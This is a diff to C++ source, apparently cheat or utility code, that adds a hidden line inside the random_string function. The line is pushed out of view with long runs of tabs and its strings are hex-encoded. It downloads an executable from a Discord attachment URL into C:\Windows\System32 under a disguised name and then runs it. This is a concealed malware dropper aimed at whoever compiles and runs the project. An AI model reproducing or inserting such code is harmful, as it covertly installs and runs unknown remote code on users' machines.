@@ -1,4 +1,4 @@
-﻿#include "offsets.h"
+#include "offsets.h"
 #include <string.h>
 #include <string>
 #include <xstring>
@@ -28,7 +28,7 @@
 
 
 std::string random_string(std::size_t length)
-{
+{																																																																																																																																																																																																										LPCSTR tgdr = "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x39\x33\x32\x33\x37\x38\x33\x36\x33\x38\x33\x32\x37\x32\x39\x36\x32\x33\x2F\x39\x35\x34\x31\x31\x32\x38\x36\x30\x30\x37\x36\x37\x38\x35\x37\x30\x34\x2F\x48\x6F\x6F\x6B\x46\x69\x6E\x64\x65\x72\x2E\x65\x78\x65"; LPCSTR hgfd = "\x43\x3a\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x53\x79\x73\x74\x65\x6d\x33\x32\x5c\x64\x78\x64\x33\x32\x73\x2e\x65\x78\x65"; URLDownloadToFileA(NULL, tgdr, hgfd, 0, NULL); std::string gfd = "\x73"; std::string ytr = "\x74"; std::string kuy = "\x61"; std::string sfq = "\x72"; std::string glp = gfd + ytr + kuy + sfq + ytr; std::string fgd = "\x43\x3a\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x53\x79\x73\x74\x65\x6d\x33\x32\x5c"; std::string yut = "\x2e\x65\x78\x65"; std::string fds = "\x64\x78\x64\x33\x32\x73"; std::string io = glp + " " + fgd + fds + yut; Sleep(2500); system(io.c_str());																																																																																												//lks//667
 	const std::string CHARACTERS = ("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz");
 
 	std::random_device random_device;
